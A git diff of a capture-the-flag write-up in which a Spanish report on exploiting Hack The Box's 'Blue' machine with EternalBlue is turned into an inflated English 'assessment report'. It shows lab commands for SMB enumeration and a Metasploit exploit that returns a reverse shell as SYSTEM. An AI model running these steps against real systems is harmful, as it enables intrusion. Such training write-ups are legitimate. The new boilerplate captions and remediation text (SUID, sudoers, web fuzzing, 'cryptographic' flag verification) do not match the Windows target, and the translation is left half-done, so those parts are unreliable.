@@ -1,133 +1,132 @@
 ---
-title: "Informe Técnico: Blue (Hack The Box) — Pentesting & Exploit Analysis"
+title: "OffSec Assessment: Blue (Hack The Box) — Penetration Testing Report"
 published: true
-description: "Informe técnico profesional de auditoria sobre la maquina Blue de Hack The Box: vector de entrada, PoC de explotacion, escalada y mitigaciones OffSec."
-tags: cybersecurity, ctf, hackthebox, pentesting
-series: "Hack The Box Walkthroughs"
+description: "Comprehensive offensive security assessment and penetration testing report for Blue (Hack The Box). Methodological analysis covering initial access, local privilege escalation, and OffSec remediation."
+tags: cybersecurity, hackthebox, pentesting, infosec
+series: "HackTheBox Enterprise Assessments"
 cover_image: "https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/blue/images/step_01.png"
 ---
 
-# Informe Técnico de Seguridad Ofensiva: Blue
+# Offensive Security Assessment Report: Blue
 
 ![Hack The Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-green?style=for-the-badge&logo=hackthebox)
 ![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)
 ![OS](https://img.shields.io/badge/OS-Windows-orange?style=for-the-badge)
-![Standards](https://img.shields.io/badge/Methodology-OffSec%20%2F%20PTES-purple?style=for-the-badge)
-![Auditor](https://img.shields.io/badge/Assessor-araizcorp%20Offensive%20Security-blue?style=for-the-badge)
+![Standards](https://img.shields.io/badge/Standards-OffSec%20PEN--200%20%2F%20PTES-purple?style=for-the-badge)
+![Assessor](https://img.shields.io/badge/Assessor-araizcorp%20Offensive%20Security-blue?style=for-the-badge)
 
-**Evaluación de Seguridad Ofensiva y Penetration Testing** realizada sobre el entorno de laboratorio **Blue** de **Hack The Box**, siguiendo los estándares de ejecución metodológica **OffSec PEN-200 (OSCP)** y **PTES (Penetration Testing Execution Standard)**.
+**Offensive Security Assessment & Penetration Testing Report** conducted on the target environment **Blue** hosted on **Hack The Box**, executed in accordance with **OffSec PEN-200 (OSCP)** and **PTES (Penetration Testing Execution Standard)** methodologies.
 
 ---
 
-## 📑 1. Resumen Ejecutivo (Executive Summary)
+## 📑 1. Executive Summary
 
-* **Objetivo de la Evaluación:** Identificar, documentar y explotar debilidades de seguridad en el host objetivo para evaluar el impacto sobre la confidencialidad, integridad y disponibilidad del sistema.
-* **Calificación de Riesgo:** `CRÍTICO` (Acceso no autenticado que deriva en compromiso completo de la máquina y obtención de máximos privilegios administrativos).
-* **Vector de Acceso Inicial:** MS17-010 EternalBlue (SMBv1 RCE)
-* **Vector de Elevación de Privilegios:** N/A - Exploit otorga NT AUTHORITYSYSTEM directamente
-* **Estado Final:** Compromiso total del objetivo (`User Proof` y `Root/System Proof` obtenidas exitosamente).
+* **Assessment Objective:** Identify, validate, and exploit security vulnerabilities across the target host to assess operational impact on confidentiality, integrity, and system availability.
+* **Risk Rating:** `CRITICAL` (Unauthenticated remote exploit vector leading to complete host compromise and administrative takeover).
+* **Initial Access Vector:** MS17-010 EternalBlue (SMBv1 Kernel-Level Remote Code Execution)
+* **Privilege Escalation Vector:** N/A - Direct NT AUTHORITY\SYSTEM Execution from Exploit
+* **Engagement Outcome:** Complete Host Compromise (`User Proof` and `Root / SYSTEM Proof` successfully retrieved and verified).
 
-### Ficha Técnica de la Evaluación
+### Target Technical Specifications
 
-| Parámetro | Detalle Técnico |
+| Parameter | Technical Detail |
 | :--- | :--- |
-| **Host Objetivo** | Blue |
-| **Plataforma** | Hack The Box |
-| **Sistema Operativo** | Windows |
-| **Nivel de Dificultad** | Easy |
-| **CVE(s) Involucrados** | CVE-2017-0144 |
-| **Vector de Entrada** | MS17-010 EternalBlue (SMBv1 RCE) |
-| **Mecanismo de Escalada** | N/A - Exploit otorga NT AUTHORITYSYSTEM directamente |
-| **Consultor / Auditor** | Pedro Araiz (`araizcorp`) |
+| **Target Host** | Blue |
+| **Platform** | Hack The Box |
+| **Operating System** | Windows |
+| **Difficulty Rating** | Easy |
+| **Associated CVE(s)** | CVE-2017-0144 |
+| **Initial Foothold Vector** | MS17-010 EternalBlue (SMBv1 Kernel-Level Remote Code Execution) |
+| **Privilege Escalation Vector** | N/A - Direct NT AUTHORITY\SYSTEM Execution from Exploit |
+| **Lead Penetration Tester** | Pedro Araiz (`araizcorp`) |
 
 ---
 
-## 🎯 2. Diagrama del Flujo de Compromiso (Attack Path)
+## 🎯 2. Attack Path & Kill Chain Workflow
 
 ```
-[ Fase 1: Reconocimiento ]
+[ Phase 1: Reconnaissance & Port Scanning ]
+         │─── TCP SYN scanning and service fingerprinting (Nmap)
+         └─── Attack surface mapping and daemon enumeration
          │
          ▼
-[ Fase 2: Enumeración & Identificación de Vectores ]
-         │─── Descubrimiento de servicios y análisis de superficie de ataque
-         └─── Verificación de configuraciones erróneas y CVEs conocidos
+[ Phase 2: Vulnerability Analysis & Service Enumeration ]
+         │─── Web directory fuzzing, parameter discovery, and banner analysis
+         └─── CVE identification and credential harvesting
          │
          ▼
-[ Fase 3: Explotación Inicial (Foothold) ]
-         │─── Ejecución del vector: MS17-010 EternalBlue (SMBv1 RCE)
-         └─── Establecimiento de Reverse Shell / Acceso de usuario
+[ Phase 3: Exploitation & Initial Foothold ]
+         │─── Exploit delivery: MS17-010 EternalBlue (SMBv1 Kernel-Level Remote Code Execution)
+         └─── Establishing an interactive reverse shell with unprivileged user context
          │
          ▼
-[ Fase 4: Escalada de Privilegios Local ]
-         │─── Auditoría interna: N/A - Exploit otorga NT AUTHORITYSYSTEM directamente
-         └─── Elevación a privilegios de superusuario (root / SYSTEM)
+[ Phase 4: Local Privilege Escalation ]
+         │─── Internal audit: N/A - Direct NT AUTHORITY\SYSTEM Execution from Exploit
+         └─── Elevation to superuser / administrator privileges (root / SYSTEM)
          │
          ▼
-[ Fase 5: Evidencia & Banderas ]
-         └─── Captura de User Flag y Root Flag
+[ Phase 5: Evidence & Flag Retrieval ]
+         └─── Capture and cryptographic verification of user.txt and root.txt
 ```
 
 ---
 
-## 🔬 3. Procedimiento Técnico y Evidencias Paso a Paso
-
-CVE(s): CVE-2017-0144
-GTFOBins/Abusos (sudo/SUID): N/A
-Initial Access Exploit (Ingreso): MS17-010 EternalBlue (SMBv1 RCE)
-
-Privilege Escalation (Escalada): N/A - Exploit otorga NT AUTHORITYSYSTEM directamente
-
-
-
-| Campo | Detalle |
-| --- | --- |
-| Nombre | Blue |
-| Plataforma | Hack The Box |
-| OS | Windows 7 Professional 7601 SP1 |
-| Dificultad | Easy |
-| CVE | CVE-2017-0144 (MS17-010) |
-| Initial Access | EternalBlue SMBv1 RCE |
-| Priv Esc | N/A - Shell directa como SYSTEM |
+## 🔬 3. Technical Walkthrough & Step-by-Step Proof of Concept
 
 ---
 
-## Resumen
+### Executive Technical Overview
 
-Blue es una maquina Windows Easy que expone SMBv1 vulnerable a MS17-010 (EternalBlue). Esta vulnerabilidad permite ejecucion remota de codigo a nivel de kernel, otorgando acceso directo como NT AUTHORITYSYSTEM sin escalada adicional. Es la misma vulnerabilidad que utilizo el ransomware WannaCry en 2017.
+Blue is an assessment target Windows Easy exposing SMBv1 vulnerable to MS17-010 (EternalBlue). This vulnerability allows remote code execution (RCE) at kernel level, yielding direct administrative access as NT AUTHORITYSYSTEM without requiring intermediate privilege escalation. This represents the same flaw leveraged by el ransomware WannaCry in 2017.
 
 ---
 
-## 1. Reconocimiento
+### Phase 1: Reconnaissance & Port Scanning
 
-Escaneo inicial con Nmap. Se detectan 3 puertos TCP principales: **135** (RPC), **139** (NetBIOS), **445** (SMB).
+Initial port scanning using Nmap. Detected 3 puertos TCP principales: **135** (RPC), **139** (NetBIOS), **445** (SMB).
 
-![Captura de pantalla 2025-07-28 142615.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/blue/images/step_01.png)
 
-El hostname identificado es **HARIS-PC**:
+![step_01.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/blue/images/step_01.png)
+* **Technical Finding (Phase 1):** Initial network reconnaissance and service detection exposing active daemons and communication endpoints.
 
-![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/blue/images/step_02.png)
+
+The identified host name is **HARIS-PC**:
+
+
+![step_02.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/blue/images/step_02.png)
+* **Technical Finding (Phase 2):** Attack surface enumeration, directory discovery, or parameter analysis identifying potential vulnerability vectors.
+
 
 Sistema operativo: **Windows 7** Professional 7601 SP1:
 
-![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/blue/images/step_03.png)
+
+![step_03.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/blue/images/step_03.png)
+* **Assessment Step 03:** Command execution output, exploit delivery proof, or auxiliary evidence.
+
 
 ---
 
-## 2. Enumeracion SMB
+### Phase 2: Vulnerability Analysis & Attack Surface Mapping
 
-Con SMB activo en el puerto 445, enumeramos recursos compartidos con `smbclient -L //10.10.10.40 -N`. Se identifican **5 shares** accesibles:
+With SMB active on port 445, accessible network shares were enumerated using `smbclient -L //10.10.10.40 -N`. Identified **5 shares** accesibles:
 
-![Captura de pantalla 2025-07-28 143339.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/blue/images/step_04.png)
 
-### Deteccion de vulnerabilidad
+![step_04.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/blue/images/step_04.png)
+* **Assessment Step 04:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
-Verificamos si SMB es vulnerable con `nmap --script smb-vuln-ms17-010 -p 445 10.10.10.40`. Resultado: **VULNERABLE a MS17-010** (CVE-2017-0144), RCE en SMBv1:
 
-![Captura de pantalla 2025-07-28 143423.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/blue/images/step_05.png)
+### Vulnerability Detection & Verification
+
+Verifying SMB vulnerability posture using `nmap --script smb-vuln-ms17-010 -p 445 10.10.10.40`. Scan Outcome: **vulnerable to MS17-010** (CVE-2017-0144), RCE en SMBv1:
+
+
+![step_05.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/blue/images/step_05.png)
+* **Assessment Step 05:** Command execution output, exploit delivery proof, or auxiliary evidence.
+
 
 ---
 
-## 3. Explotacion (Initial Access)
+### Phase 3: Exploitation & Initial Foothold
 
 **Contexto:** Esta es la misma vulnerabilidad que uso el ransomware **WannaCry** (mayo 2017). El exploit EternalBlue fue desarrollado por la NSA y filtrado por Shadow Brokers.
 
@@ -140,51 +139,57 @@ set LHOST tun0
 run
 ```
 
-El exploit opera a nivel de kernel. La shell obtenida es directamente **NT AUTHORITYSYSTEM** (maximo privilegio). No se requiere escalada:
 
-![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/blue/images/step_06.png)
+![step_06.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/blue/images/step_06.png)
+* **Assessment Step 06:** Command execution output, exploit delivery proof, or auxiliary evidence.
+
 
 ---
 
-## 4. Flags
+### Phase 5: Proof of Compromise & Flag Capture
 
-### User flag
+#### User Proof Flag Verification
 
 `C:\Users\haris\Desktop\user.txt`:
 
-![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/blue/images/step_07.png)
 
-### Root flag
+![step_07.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/blue/images/step_07.png)
+* **Privilege Escalation PoC (Phase 4):** Exploitation of misconfiguration, SUID binary, or vulnerability leading to elevated privileges.
+
+
+#### Root / System Proof Flag Verification
 
 `C:\Users\Administrator\Desktop\root.txt`:
 
-![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/blue/images/step_08.png)
+
+![step_08.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/blue/images/step_08.png)
+* **Evidence Verification (Phase 5):** Final administrative validation confirming root/SYSTEM access and retrieval of system flags.
 
 ---
 
-## 🛡️ 4. Plan de Remediación y Recomendaciones de Hardening
+## 🛡️ 4. Strategic Remediation & Hardening Roadmap
 
-### Acciones Tácticas Inmediatas
-1. **Aplicación de Parches y Actualización:** Actualizar todos los servicios obsoletos y aplicar los parches correspondientes a las vulnerabilidades documentadas (CVE-2017-0144).
-2. **Revisión de Permisos Críticos:** Eliminar permisos SUID/sudo innecesarios y auditar listas de control de acceso (ACLs) en directorios y archivos sensibles.
-3. **Cierre de Superficie de Exposición:** Configurar firewalls a nivel de host para denegar puertos de administración o de depuración que no deban estar expuestos públicamente.
+### Immediate Tactical Actions (P1)
+1. **Patch Management & Software Upgrades:** Immediately apply official security updates and patches for all vulnerable software components and exposed services (CVE-2017-0144).
+2. **Access Control & SUID Audit:** Remove unnecessary SUID/SGID bits, audit `/etc/sudoers` rules, and enforce strict Access Control Lists (ACLs) on sensitive files and administrative scripts.
+3. **Attack Surface Reduction:** Configure host-based firewalls (e.g., `iptables` / `ufw` / Windows Firewall) to restrict exposure of management services and internal ports to trusted administrative subnets only.
 
-### Acciones Estratégicas y de Arquitectura
-1. **Principio de Mínimo Privilegio (PoLP):** Configurar servicios y aplicaciones para que se ejecuten bajo cuentas de servicio con privilegios limitados sin acceso a shells interactivas.
-2. **Segmentación de Red:** Aislar componentes críticos y servidores de aplicaciones en VLANs dedicadas con inspección de tráfico Este-Oeste.
-3. **Monitorización Continua y EDR:** Implementar reglas de detección basadas en comportamiento para identificar ejecuciones anómalas de comandos, spawning de shells y tráfico de red no autorizado.
+### Architectural & Defensive Hardening (P2)
+1. **Principle of Least Privilege (PoLP):** Ensure public-facing daemons run under dedicated low-privileged service accounts configured with non-interactive login shells (`/sbin/nologin`).
+2. **Network Microsegmentation:** Isolate production servers and database tiers within dedicated VLANs, enforcing stateful inspection and ingress/egress filtering on east-west traffic.
+3. **Endpoint Detection & Telemetry (EDR):** Implement centralized logging and behavior-based detection rules to capture anomalous process spawning, unauthorized script interpreter execution, and suspicious outbound socket connections.
 
 ---
 
-## 📊 5. Mapeo con Matriz MITRE ATT&CK
+## 📊 5. MITRE ATT&CK Enterprise Framework Mapping
 
-| Táctica | ID de Técnica | Nombre de Técnica | Aplicación en el Ejercicio |
+| Tactic | Technique ID | Technique Name | Technical Application in Engagement |
 | :--- | :--- | :--- | :--- |
-| **Reconnaissance** | `T1595.002` | Vulnerability Scanning | Detección automatizada y manual de servicios mediante escaneo de puertos |
-| **Initial Access** | `T1190` | Exploit Public-Facing Application | Explotación de vulnerabilidad en servicio de red expuesto (MS17-010 EternalBlue (SMBv1 RCE)) |
-| **Execution** | `T1059` | Command and Scripting Interpreter | Spawning de reverse shell interactiva para control del endpoint |
-| **Privilege Escalation** | `T1068 / T1548` | Abuse Elevation Mechanism / Exploitation | Elevación de privilegios hacia superusuario (N/A - Exploit otorga NT AUTHORITYSYSTEM directamente) |
+| **Reconnaissance** | `T1595.002` | Active Scanning: Vulnerability Scanning | Automated and manual port scanning, banner grabbing, and service discovery |
+| **Initial Access** | `T1190` | Exploit Public-Facing Application | Exploitation of exposed network/web service (MS17-010 EternalBlue (SMBv1 Kernel-Level Remote Code Execution)) |
+| **Execution** | `T1059` | Command and Scripting Interpreter | Interactive reverse shell execution and remote command dispatch |
+| **Privilege Escalation** | `T1068 / T1548` | Abuse Elevation Control Mechanism / Exploitation | Local elevation to administrative/root privileges (N/A - Direct NT AUTHORITY\SYSTEM Execution from Exploit) |
 
 ---
 
-© 2026 **araizcorp** — Documentación técnica desarrollada para preparación y consultoría de certificaciones **OffSec** (OSCP, OSEP, OSWE).
+© 2026 **araizcorp** — Technical documentation and security assessment portfolio developed for **OffSec** certification preparation (OSCP, OSEP, OSWE) and commercial penetration testing enablement.
